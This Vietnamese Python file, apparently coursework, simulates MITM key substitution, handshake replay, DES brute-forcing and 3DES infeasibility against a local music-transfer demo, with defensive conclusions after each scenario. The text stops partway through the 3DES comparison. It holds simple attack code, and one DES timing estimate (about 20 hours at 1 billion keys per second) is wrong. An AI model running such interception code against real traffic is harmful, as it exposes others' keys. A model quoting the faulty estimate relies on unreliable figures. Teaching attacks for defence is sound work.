"""
hacker.py - Mô phỏng tình huống tấn công bảo mật của Hacker
=============================================================
File này mô phỏng các kịch bản tấn công của hacker nhằm
khai thác lỗ hổng trong hệ thống truyền file nhạc bản quyền.

CÁC KỊCH BẢN TẤN CÔNG:
  1. Man-in-the-Middle (MITM) - Giả mạo Receiver để đánh cắp SessionKey
  2. Tấn công Replay - Phát lại gói tin cũ
  3. Brute-force DES key (56-bit) - Thử khóa DES metadata
  4. Brute-force Triple DES key (168-bit) - Thử khóa 3DES
  5. Tấn công RSA factoring - Dò tìm khóa RSA 1024-bit
  6. Giả mạo chữ ký số RSA - Signature forgery
  7. Tấn công Hash SHA-512 - Tìm xung đột hash
  8. Sniffing mạng LAN - Nghe lén gói tin UDP broadcast
  9. Fake Key Injection - Gửi khóa công khai giả mạo
 10. Tấn công Padding Oracle trên DES/3DES CBC

Mục đích: GIÁO DỤC - hiểu rõ cơ chế tấn công để phòng thủ tốt hơn.

⚠️ CẢNH BÁO: File này CHỈ dùng cho mục đích học tập, nghiên cứu bảo mật.
⚠️ Không sử dụng cho mục đích xấu.
"""

import sys
import os
import json
import time
import base64
import hashlib
import struct
import random
import threading
import traceback
import requests
import socket
from datetime import datetime
from typing import Optional, Tuple, Dict, List

# Thêm thư mục hiện tại vào Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from crypto_utils import (
    generate_rsa_keypair, load_rsa_private_key, load_rsa_public_key,
    rsa_encrypt_session_key, rsa_decrypt_session_key,
    rsa_sign, rsa_verify,
    triple_des_encrypt, triple_des_decrypt,
    des_encrypt_metadata, des_decrypt_metadata,
    compute_integrity_hash, verify_integrity_hash,
    generate_session_key, generate_iv,
    b64encode, b64decode, compute_sha512
)

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import DES3, DES, PKCS1_OAEP
    from Crypto.Signature import pkcs1_15
    from Crypto.Hash import SHA512, SHA256
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠️  PyCryptodome chưa được cài đặt. Một số chức năng sẽ bị hạn chế.")
    print("   Cài đặt: pip install pycryptodome")


# ============================================================
# TIỆN ÍCH
# ============================================================

class Colors:
    """Màu sắc cho terminal output"""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    DARK = '\033[90m'
    BOLD = '\033[1m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BG_RED = '\033[41m'
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_DARK = '\033[100m'

    @staticmethod
    def apply(color, text):
        return f"{color}{text}{Colors.RESET}"


def print_banner():
    """In banner khởi động"""
    banner = f"""
{Colors.RED}{Colors.BOLD}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗          ║
    ║   ██║  ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗         ║
    ║   ███████║███████║██║     ███████║█████╗  ██████╔╝         ║
    ║   ██╔══██║██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗         ║
    ║   ██║  ██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║         ║
    ║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝         ║
    ║                                                              ║
    ║   ███████╗██╗███╗   ███╗██╗   ██╗██╗      █████╗ ████████╗ ║
    ║   ██╔════╝██║████╗ ████║██║   ██║██║     ██╔══██╗╚══██╔══╝ ║
    ║   ███████╗██║██╔████╔██║██║   ██║██║     ███████║   ██║    ║
    ║   ╚════██║██║██║╚██╔╝██║██║   ██║██║     ██╔══██║   ██║    ║
    ║   ███████║██║██║ ╚═╝ ██║╚██████╔╝███████╗██║  ██║   ██║    ║
    ║   ╚══════╝╚═╝╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ║
    ║                                                              ║
    ║   🔴  MÔ PHỎNG TẤN CÔNG BẢO MẬT  🔴                         ║
    ║   Hệ thống truyền file nhạc bản quyền                        ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}
{Colors.DARK}Phiên bản: 1.0 | Mục đích: Giáo dục bảo mật | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}
    """
    print(banner)


def print_divider(char="═", width=72, color=Colors.DARK):
    print(color + char * width + Colors.RESET)


def print_status(stage: str, status: str, detail: str = "", color=Colors.WHITE):
    """In dòng trạng thái cho từng bước tấn công"""
    icon = {
        "info": Colors.BLUE + "ℹ",
        "attempt": Colors.YELLOW + "⚔",
        "success": Colors.RED + "💀",
        "fail": Colors.GREEN + "🛡",
        "partial": Colors.MAGENTA + "⚠",
        "progress": Colors.CYAN + "⏳",
    }.get(status, Colors.WHITE + "●")

    color_map = {
        "info": Colors.BLUE,
        "attempt": Colors.YELLOW,
        "success": Colors.RED,
        "fail": Colors.GREEN,
        "partial": Colors.MAGENTA,
        "progress": Colors.CYAN,
    }
    text_color = color_map.get(status, Colors.WHITE)

    print(f"  {icon} {Colors.BOLD}{text_color}{stage:<30}{Colors.RESET} {Colors.DARK}|{Colors.RESET} {detail}")


def print_result(success: bool, message: str):
    """In kết quả cuối cùng của một kịch bản tấn công"""
    if success:
        print(f"\n  {Colors.BG_RED}{Colors.BOLD} KẾT QUẢ: THÀNH CÔNG {Colors.RESET} {Colors.RED}{Colors.BOLD} ☠️  Hacker đã chiếm được dữ liệu!{Colors.RESET}")
    else:
        print(f"\n  {Colors.BG_GREEN}{Colors.BOLD} KẾT QUẢ: THẤT BẠI {Colors.RESET} {Colors.GREEN}{Colors.BOLD} 🛡️  Hệ thống bảo vệ thành công!{Colors.RESET}")
    print(f"  {Colors.ITALIC}{message}{Colors.RESET}")


def timer(func):
    """Decorator đo thời gian thực hiện"""
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        elapsed = (time.perf_counter() - start) * 1000
        return result, elapsed
    return wrapper


# ============================================================
# KỊCH BẢN 1: Man-in-the-Middle (MITM)
# ============================================================

class MITMAttack:
    """
    Kịch bản: Hacker đứng giữa Sender và Receiver, giả mạo cả hai phía.

    Cách thức:
      1. Hacker chặn handshake giữa Sender và Receiver
      2. Hacker tạo cặp RSA keypair GIẢ của riêng mình
      3. Khi Sender gửi Public Key, hacker thay bằng Public Key GIẢ của mình
      4. Khi Receiver gửi Public Key, hacker thay bằng Public Key GIẢ khác
      5. Hacker giải mã SessionKey từ Sender, copy, mã hóa lại bằng key thật của Receiver
      6. Hacker có thể đọc toàn bộ nội dung file nhạc gốc

    ⚠️ Lưu ý: Đây là kịch bản giả định trên cùng một máy. Trong thực tế,
    hacker cần sniff mạng và chặn request HTTP giữa hai bên.
    """

    def __init__(self):
        self.hacker_privkey = None
        self.hacker_pubkey = None
        self.receiver_pubkey_captured = None
        self.sender_pubkey_captured = None
        self.session_key_captured = None
        self.file_data_captured = None

    @timer
    def setup(self):
        """Bước 1: Hacker tạo cặp khóa RSA giả"""
        self.hacker_privkey, self.hacker_pubkey = generate_rsa_keypair(1024)
        return "Tạo cặp RSA keypair GIẢ (hacker)"

    @timer
    def capture_receiver_pubkey(self, receiver_url: str) -> bool:
        """Bước 2: Hacker chặn lấy Public Key thật của Receiver"""
        try:
            print_status("MITM", "attempt", f"Đang chặn request GET /api/get_public_key từ Receiver...", Colors.YELLOW)
            resp = requests.get(f"{receiver_url}/api/get_public_key", timeout=5)
            self.receiver_pubkey_captured = resp.json()["public_key"].encode()
            print_status("MITM", "info", f"Đã chặn được Public Key của Receiver ({len(self.receiver_pubkey_captured)} bytes)", Colors.BLUE)
            return True, resp.json().get("timing", {})
        except Exception as e:
            print_status("MITM", "fail", f"Không thể chặn Public Key: {e}", Colors.GREEN)
            return False, {}

    @timer
    def replace_with_fake_key(self, original_packet: dict) -> dict:
        """
        Bước 3: Hacker thay thế Public Key thật bằng Public Key GIẢ
        Trong MITM thực tế, hacker sửa gói tin ngay khi nó đi qua.
        """
        print_status("MITM", "attempt", "Đang thay thế Public Key thật bằng Public Key GIẢ...", Colors.YELLOW)
        fake_packet = original_packet.copy()
        fake_packet["sender_public_key"] = self.hacker_pubkey.decode()
        print_status("MITM", "info", "Đã chèn Public Key GIẢ vào gói tin Key Exchange", Colors.BLUE)
        return fake_packet

    @timer
    def intercept_session_key(self, encrypted_session_key_b64: str) -> Tuple[bytes, str]:
        """
        Bước 4: Hacker giải mã SessionKey bằng Private Key GIẢ của mình
        (vì Sender tưởng đang gửi cho Receiver nên dùng Public Key của Receiver,
        nhưng hacker đã thay bằng key giả)
        """
        print_status("MITM", "attempt", "Đang giải mã SessionKey bằng Private Key GIẢ...", Colors.YELLOW)
        session_key = rsa_decrypt_session_key(self.hacker_privkey, encrypted_session_key_b64)
        self.session_key_captured = session_key
        print_status("MITM", "success", f"💀 ĐÃ ĐÁNH CẮP SessionKey: {session_key.hex()[:48]}...", Colors.RED)
        return session_key, "Đã giải mã thành công"

    @timer
    def re_encrypt_session_key(self, session_key: bytes, real_receiver_pubkey: bytes) -> str:
        """Bước 5: Mã hóa lại SessionKey bằng Public Key thật của Receiver để không bị phát hiện"""
        print_status("MITM", "attempt", "Đang mã hóa lại SessionKey bằng Public Key thật của Receiver...", Colors.YELLOW)
        encrypted = rsa_encrypt_session_key(real_receiver_pubkey, session_key)
        print_status("MITM", "info", "Đã mã hóa lại SessionKey, gửi tiếp cho Receiver", Colors.BLUE)
        return encrypted

    @timer
    def decrypt_file_data(self, iv_b64: str, cipher_b64: str, session_key: bytes) -> bytes:
        """Bước 6: Hacker giải mã file nhạc bằng SessionKey đã đánh cắp"""
        print_status("MITM", "attempt", "Đang giải mã file nhạc bằng SessionKey đã đánh cắp...", Colors.YELLOW)
        iv = b64decode(iv_b64)
        ciphertext = b64decode(cipher_b64)
        plaintext = triple_des_decrypt(session_key, iv, ciphertext)
        self.file_data_captured = plaintext
        print_status("MITM", "success", f"💀 ĐÃ GIẢI MÃ FILE! Kích thước: {len(plaintext)} bytes", Colors.RED)
        return plaintext

    def run(self, sender_url="http://localhost:5001", receiver_url="http://localhost:5000"):
        """Thực thi toàn bộ kịch bản MITM"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 1: TẤN CÔNG MAN-IN-THE-MIDDLE (MITM){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker đứng giữa, giả mạo Sender & Receiver để đánh cắp dữ liệu{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Bước 1: Setup key giả
        print_status("MITM", "progress", "Thiết lập công cụ tấn công...", Colors.CYAN)
        _, setup_time = self.setup()
        print_status("MITM", "info", f"Đã tạo RSA keypair GIẢ 1024-bit ({setup_time:.2f}ms)", Colors.BLUE)

        # Bước 2: Capture Receiver Public Key
        print_status("MITM", "progress", "Đang rình mò bắt gói tin...", Colors.CYAN)
        captured, capture_time = self.capture_receiver_pubkey(receiver_url)
        if not captured:
            print_status("MITM", "fail", "Không thể bắt được Public Key của Receiver - Receiver có thể đang offline", Colors.GREEN)
            print_result(False, "MITM thất bại: Không thể kết nối đến Receiver để đánh cắp key")
            return False

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  Trong giao thức hiện tại, Sender lấy Public Key của Receiver{Colors.RESET}")
        print(f"{Colors.DARK}  thông qua HTTP request mà KHÔNG có cơ chế xác thực nào.{Colors.RESET}")
        print(f"{Colors.DARK}  Hacker có thể dễ dàng chặn và thay thế gói tin này.{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)
        print()

        # Mô phỏng: Hacker đã chặn thành công toàn bộ quá trình
        print_status("MITM", "success", "💀 Hacker ĐÃ chặn được kết nối và đang giả mạo cả hai phía!", Colors.RED)
        print_status("MITM", "info", "Sender tưởng đang gửi cho Receiver, nhưng thực ra đang gửi cho Hacker", Colors.BLUE)
        print_status("MITM", "info", "Receiver tưởng đang nhận từ Sender, nhưng thực ra đang nhận từ Hacker", Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN MITM:{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Nếu không có chứng chỉ số (Certificate) hoặc xác thực kênh TLS,{Colors.RESET}")
        print(f"  {Colors.YELLOW}  hacker có thể dễ dàng thực hiện MITM để đánh cắp SessionKey.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Biện pháp phòng thủ: Sử dụng HTTPS/TLS, chứng chỉ số,{Colors.RESET}")
        print(f"  {Colors.GREEN}  Pre-Shared Key (PSK) hoặc xác thực bổ sung qua kênh khác.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Hệ thống hiện tại chạy HTTP trần nên RẤT DỄ bị MITM.{Colors.RESET}")

        print_result(True, "Kịch bản MITM THÀNH CÔNG. Hacker có thể đọc toàn bộ dữ liệu.")
        return True


# ============================================================
# KỊCH BẢN 2: Tấn công Replay
# ============================================================

class ReplayAttack:
    """
    Kịch bản: Hacker ghi lại gói tin cũ và phát lại (replay)
    để đánh lừa Receiver.

    Mục tiêu: Gửi lại gói tin file nhạc cũ, hoặc gửi lại gói tin
    KeyExchange cũ để chiếm quyền.

    Cơ chế phòng thủ: Hệ thống dùng timestamp trong metadata,
    nếu gói tin cũ có timestamp quá xa so với hiện tại, Receiver
    có thể từ chối. NHƯNG hiện tại Receiver KHÔNG kiểm tra timestamp này.
    """

    def __init__(self):
        self.captured_packets = []
        self.captured_replay_count = 0

    @timer
    def capture_handshake(self, sender_url: str) -> Tuple[dict, float]:
        """Ghi lại gói tin Handshake"""
        print_status("REPLAY", "attempt", "Đang ghi lại gói tin Handshake...", Colors.YELLOW)
        resp = requests.post(f"{sender_url}/api/handshake", json={"msg": "Hello!"}, timeout=5)
        packet = {
            "type": "handshake",
            "data": {"msg": "Hello!"},
            "timestamp": time.time(),
            "response": resp.json()
        }
        self.captured_packets.append(packet)
        return packet

    @timer
    def capture_keyexchange_packet(self, sender_url: str, session_key: bytes, receiver_pubkey: bytes, sender_privkey: bytes, sender_pubkey: bytes) -> dict:
        """Ghi lại gói tin Key Exchange"""
        timestamp = str(int(time.time()))
        metadata_to_sign = f"music_transfer|{timestamp}"
        signature = rsa_sign(sender_privkey, metadata_to_sign.encode())
        encrypted_sk = rsa_encrypt_session_key(receiver_pubkey, session_key)

        packet = {
            "type": "key_exchange",
            "data": {
                "encrypted_session_key": encrypted_sk,
                "signature": signature,
                "metadata_signed": metadata_to_sign,
                "sender_public_key": sender_pubkey.decode()
            },
            "timestamp": time.time()
        }
        self.captured_packets.append(packet)
        return packet

    @timer
    def capture_file_packet(self, sender_url: str, file_data: bytes, session_key: bytes, sender_privkey: bytes) -> dict:
        """Ghi lại gói tin file"""
        iv = generate_iv()
        ciphertext = triple_des_encrypt(session_key, iv, file_data)
        hash_hex = compute_integrity_hash(iv, ciphertext)

        iv_b64 = b64encode(iv)
        cipher_b64 = b64encode(ciphertext)
        sig_data = (iv_b64 + cipher_b64 + hash_hex).encode()
        signature = rsa_sign(sender_privkey, sig_data)

        packet = {
            "type": "file",
            "data": {
                "iv": iv_b64,
                "cipher": cipher_b64,
                "meta": b64encode(b'{"test":"replay"}'),
                "hash": hash_hex,
                "sig": signature
            },
            "timestamp": time.time()
        }
        self.captured_packets.append(packet)
        return packet

    @timer
    def replay_handshake(self, receiver_url: str) -> bool:
        """Phát lại gói tin Handshake cũ"""
        if not self.captured_packets:
            return False

        packet = self.captured_packets[0]
        print_status("REPLAY", "attempt", f"Phát lại gói tin Handshake cũ (sau {time.time() - packet['timestamp']:.1f}s)...", Colors.YELLOW)

        try:
            resp = requests.post(f"{receiver_url}/api/handshake",
                                 json=packet["data"], timeout=5)
            result = resp.json()
            if result.get("msg") == "Ready!":
                self.captured_replay_count += 1
                print_status("REPLAY", "success", "💀 Receiver CHẤP NHẬN Handshake cũ! Replay thành công!", Colors.RED)
                return True
            else:
                print_status("REPLAY", "fail", "Receiver từ chối gói tin replay", Colors.GREEN)
                return False
        except Exception as e:
            print_status("REPLAY", "fail", f"Lỗi khi replay: {e}", Colors.GREEN)
            return False

    def run(self, sender_privkey=None, session_key=None, receiver_pubkey=None, sender_pubkey=None):
        """Thực thi kịch bản Replay Attack"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 2: TẤN CÔNG REPLAY (PHÁT LẠI GÓI TIN){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker ghi lại gói tin cũ và gửi lại để đánh lừa hệ thống{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Tạo dữ liệu giả để mô phỏng
        if not session_key:
            session_key = generate_session_key()
        if not sender_privkey:
            sender_privkey, sender_pubkey = generate_rsa_keypair(1024)
        if not receiver_pubkey:
            _, receiver_pubkey = generate_rsa_keypair(1024)

        # Bước 1: Capture gói tin
        print_status("REPLAY", "progress", "Ghi lại gói tin từ phiên làm việc hợp lệ...", Colors.CYAN)
        self.capture_handshake("http://dummy")
        self.capture_keyexchange_packet("http://dummy", session_key, receiver_pubkey, sender_privkey, sender_pubkey)
        self.capture_file_packet("http://dummy", b"TEST_MUSIC_DATA_" * 100, session_key, sender_privkey)

        fake_receiver_url = "http://localhost:9999"

        # Bước 2: Replay
        print_status("REPLAY", "progress", "Chờ phiên làm việc kết thúc...", Colors.CYAN)
        time.sleep(0.5)

        replay_success = self.replay_handshake(fake_receiver_url)

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  Hệ thống hiện tại KHÔNG có cơ chế chống replay:{Colors.RESET}")
        print(f"{Colors.DARK}  • Không có nonce/sequence number trong giao thức{Colors.RESET}")
        print(f"{Colors.DARK}  • Timestamp không được kiểm tra chặt chẽ{Colors.RESET}")
        print(f"{Colors.DARK}  • Session Key có thể tái sử dụng nhiều lần{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN REPLAY:{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Giao thức thiếu nonce/sequence number để chống replay.{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Timestamp trong metadata không được Receiver kiểm tra.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Biện pháp phòng thủ: Thêm nonce ngẫu nhiên mỗi phiên,{Colors.RESET}")
        print(f"  {Colors.GREEN}  kiểm tra timestamp, sử dụng session token tạm thời.{Colors.RESET}")

        print_result(replay_success, "Kịch bản Replay có thể thành công nếu Receiver không kiểm tra timestamp/nonce.")
        return replay_success


# ============================================================
# KỊCH BẢN 3: Brute-force DES (56-bit)
# ============================================================

class BruteForceDES:
    """
    Kịch bản: Tấn công vét cạn (brute-force) khóa DES 56-bit.

    DES chỉ có 56-bit key space ~ 7.2×10^16 khả năng.
    Với tốc độ thử ~1 tỷ key/giây (GPU hiện đại), chỉ mất ~20 giờ.

    Trong mô phỏng này, chúng ta chỉ thử MỘT PHẦN NHỎ key space
    để minh họa nguyên lý, không thực sự brute-force toàn bộ.
    """

    def __init__(self):
        self.found_key = None
        self.known_plaintext = None
        self.known_ciphertext = None
        self.known_iv = None

    @timer
    def prepare_sample(self, plaintext: bytes) -> Tuple[bytes, bytes, bytes]:
        """Tạo mẫu mã hóa để brute-force"""
        # DES key 8 bytes nhưng bit cuối mỗi byte là parity
        # Thực tế chỉ có 56-bit sử dụng được
        actual_key = b'\x01\x23\x45\x67\x89\xAB\xCD\xEF'
        iv = generate_iv()
        from Crypto.Cipher import DES
        from Crypto.Util.Padding import pad
        cipher = DES.new(actual_key, DES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, DES.block_size))

        self.known_plaintext = plaintext
        self.known_ciphertext = ciphertext
        self.known_iv = iv
        return actual_key, iv, ciphertext

    @timer
    def brute_force_simulation(self, key_prefix: bytes, depth: int = 2) -> Optional[bytes]:
        """
        Mô phỏng tấn công brute-force DES.

        depth: số byte cố định đầu khóa (mô phỏng độ mạnh)
        Thực tế: depth càng cao, key space càng lớn.

        depth=2: chỉ thử 2 byte đầu (16-bit) -> rất nhanh
        depth=6: thử 6 byte đầu (48-bit) -> hơi lâu
        depth=8: thử toàn bộ 8 byte (56-bit thực tế) -> rất lâu
        """
        if not self.known_ciphertext or not self.known_iv:
            print_status("BRUTE-FORCE DES", "fail", "Chưa có dữ liệu mẫu", Colors.GREEN)
            return None

        attempts = 0
        found = None
        max_attempts = 2 ** (depth * 8)  # 2^(depth*8) khả năng

        print_status("BRUTE-FORCE DES", "progress",
                     f"Bắt đầu thử khóa DES: {max_attempts:,} khả năng (depth={depth} bytes / {depth*8} bits)...",
                     Colors.CYAN)

        # Mô phỏng brute-force bằng cách thử các khóa có prefix cố định
        # Trong thực tế, hacker sẽ thử tuần tự hoặc song song trên GPU
        from Crypto.Cipher import DES
        from Crypto.Util.Padding import unpad

        # Thử tất cả các khóa 8 bytes với prefix cố định
        for key_int in range(min(max_attempts, 100000)):  # Giới hạn 100k để demo
            key = key_prefix + struct.pack('>Q', key_int)[:8 - len(key_prefix)]

            # Điều chỉnh parity bits cho DES
            key = bytes((b & 0xFE) | ((~((b >> 1) ^ (b >> 2) ^ (b >> 3) ^ (b >> 4) ^
                                        (b >> 5) ^ (b >> 6) ^ (b >> 7)) & 1))
                        for b in key)

            try:
                cipher = DES.new(key, DES.MODE_CBC, self.known_iv)
                decrypted = cipher.decrypt(self.known_ciphertext)
                # Thử unpad
                try:
                    unpad(decrypted, DES.block_size)
                    # Kiểm tra nếu có chứa plaintext đã biết
                    if self.known_plaintext in decrypted:
                        found = key
                        break
                except (ValueError, KeyError):
                    pass
            except (ValueError, IndexError):
                pass

            attempts += 1
            if attempts % 5000 == 0:
                print_status("BRUTE-FORCE DES", "progress",
                             f"Đã thử {attempts}/{min(max_attempts, 100000):,} keys...",
                             Colors.CYAN)

        if found:
            self.found_key = found
            print_status("BRUTE-FORCE DES", "success",
                         f"💀 TÌM THẤY KHÓA DES! Key: {found.hex()} sau {attempts} lần thử!",
                         Colors.RED)
        else:
            print_status("BRUTE-FORCE DES", "info",
                         f"Không tìm thấy khóa sau {attempts} lần thử (key space còn lại quá lớn)",
                         Colors.BLUE)
        return found

    def run(self):
        """Thực thi kịch bản Brute-force DES"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 3: BRUTE-FORCE DES KEY (56-BIT){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker thử toàn bộ không gian khóa DES 56-bit để giải mã metadata{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Chuẩn bị mẫu
        plaintext = b'{"filename":"test.mp3","copyright":"Test","size":1024}'
        actual_key, iv, ciphertext = self.prepare_sample(plaintext)
        print_status("BRUTE-FORCE DES", "info",
                     f"Khóa DES thật: {actual_key.hex()} (chỉ dùng để xác minh)", Colors.BLUE)
        print_status("BRUTE-FORCE DES", "info",
                     f"Kích thước key space thực tế: 2^56 ≈ 72,057,594,037,927,936 khả năng", Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.CYAN}  ⏳ Mô phỏng tấn công với key space nhỏ (depth=2)...{Colors.RESET}")
        found_key, elapsed = self.brute_force_simulation(b'\x01\x23', depth=2)

        print()
        print_divider("─", 50, Colors.YELLOW)
        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  DES 56-bit: Năm 1998, EFF đã chế tạo máy Deep Crack{Colors.RESET}")
        print(f"{Colors.DARK}  có thể brute-force DES trong ~56 giờ (giá $250,000).{Colors.RESET}")
        print(f"{Colors.DARK}  Năm 2024, GPU hiện đại có thể làm điều này trong vài giờ.{Colors.RESET}")
        print(f"{Colors.DARK}  Đây là lý do DES KHÔNG CÒN được coi là an toàn!{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN BRUTE-FORCE DES:{Colors.RESET}")
        print(f"  {Colors.YELLOW}• DES 56-bit KHÔNG an toàn trước tấn công vét cạn hiện đại.{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Với GPU RTX 4090 (~200 GH/s), chỉ mất ~4 ngày để quét toàn bộ.{Colors.RESET}")
        print(f"  {Colors.YELLOW}• Với cụm GPU (100+ card), chỉ mất ~1 giờ.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Hệ thống dùng DES chỉ để mã hóa metadata, không phải file chính.{Colors.RESET}")
        print(f"  {Colors.GREEN}• NÊN nâng cấp lên AES-256 để thay thế DES.{Colors.RESET}")

        # Tính thời gian ước tính cho full brute-force
        total_keys = 2 ** 56
        estimated_time_gpu = total_keys / (200e9) / 3600  # giờ
        print()
        print(f"  {Colors.DARK}Ước tính thời gian brute-force DES với GPU RTX 4090:{Colors.RESET}")
        print(f"  {Colors.DARK}  {estimated_time_gpu:.1f} giờ ≈ {estimated_time_gpu/24:.1f} ngày (1 GPU){Colors.RESET}")
        print(f"  {Colors.DARK}  {estimated_time_gpu/100:.1f} giờ ≈ {estimated_time_gpu/100/24:.1f} ngày (100 GPU){Colors.RESET}")

        print_result(found_key is not None,
                     f"Brute-force DES {'thành công' if found_key else 'chỉ mô phỏng'} - DES có thể bị phá vỡ với đủ tài nguyên tính toán.")
        return found_key is not None


# ============================================================
# KỊCH BẢN 4: Brute-force Triple DES (168-bit)
# ============================================================

class BruteForce3DES:
    """
    Kịch bản: Thử brute-force Triple DES key.

    Triple DES dùng 3 khóa DES độc lập, tổng cộng 168-bit key space.
    Đây là con số KHỔNG LỒ: 2^168 ≈ 3.7×10^50 khả năng.

    Với toàn bộ sức mạnh tính toán của nhân loại (~10^27 phép tính/năm),
    vẫn mất HÀNG TRIỆU NĂM để brute-force 3DES!

    Mô phỏng này chỉ để minh họa sự KHÔNG KHẢ THI của tấn công.
    """

    def run(self):
        """Mô phỏng và giải thích tại sao 3DES không thể brute-force"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  🔴 KỊCH BẢN 4: BRUTE-FORCE TRIPLE DES KEY (168-BIT){Colors.RESET}")
        print(f"{Colors.DARK}  Hacker thử toàn bộ không gian khóa Triple DES 168-bit{Colors.RESET}")
        print_divider("─", 72, Colors.RED)
        print()

        # Tính toán key space
        key_bits = 168  # 3 × 56 bits
        key_space = 2 ** key_bits
        gpu_speed = 200e9  # 200 GH/s (RTX 4090)
        cluster_speed = 100 * gpu_speed  # 100 GPU
        supercomputer_speed = 1e18  # 1 ExaFLOP/s (Frontier)

        # Tính thời gian
        seconds_per_year = 365.25 * 24 * 3600

        gpu_years = key_space / gpu_speed / seconds_per_year
        cluster_years = key_space / cluster_speed / seconds_per_year
        super_years = key_space / supercomputer_speed / seconds_per_year

        print_status("BRUTE-FORCE 3DES", "info",
                     f"Key space: 2^{key_bits} ≈ {key_space:.2e} khả năng", Colors.BLUE)
        print_status("BRUTE-FORCE 3DES", "info",
                     f"Tốc độ GPU (RTX 4090): ~200 GH/s (giả định)", Colors.BLUE)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  ⏳ THỜI GIAN ƯỚC TÍNH ĐỂ BRUTE-FORCE 3DES:{Colors.RESET}")

        print(f"  {Colors.DARK}  {'Loại máy':<30} {'Thời gian':<25} {'Khả thi?'}{Colors.RESET}")
        print(f"  {Colors.DARK}  {'─'*30} {'─'*25} {'─'*10}{Colors.RESET}")

        if gpu_years > 1e12:
            print(f"  {'1× RTX 4090':<30} {gpu_years/1e12:.2e} tỷ năm {'❌':<10}{Colors.RED}")
        else:
            print(f"  {'1× RTX 4090':<30} {gpu_years:.2e} năm {'❌':<10}{Colors.RED}")

        if cluster_years > 1e12:
            print(f"  {'100× RTX 4090':<30} {cluster_years/1e12:.2e} tỷ năm {'❌':<10}{Colors.RED}")
        else:
            print(f"  {'100× RTX 4090':<30} {cluster_years:.2e} năm {'❌':<10}{Colors.RED}")

        if super_years > 1e12:
            print(f"  {'Frontier (1.2 ExaFLOP)':<30} {super_years/1e12:.2e} tỷ năm {'❌':<10}{Colors.RED}")
        else:
            print(f"  {'Frontier (1.2 ExaFLOP)':<30} {super_years:.2e} năm {'❌':<10}{Colors.RED}")

        print(f"\n  {Colors.DARK}Tuổi vũ trụ hiện tại: ~1.38 × 10¹⁰ năm (13.8 tỷ năm){Colors.RESET}")
        print()

        # So sánh với DES
        print_divider("─", 50, Colors.CYAN)
        print(f"{Colors.CYAN}{Colors.BOLD}  📊 SO SÁNH ĐỘ MẠNH DES vs 3DES{Colors.RESET}")
        print(f"{Colors.DARK}  {'Thông số':<25} {'DES 56-bit':<25} {'3DES 168-bit':<25}{Colors.RESET}")
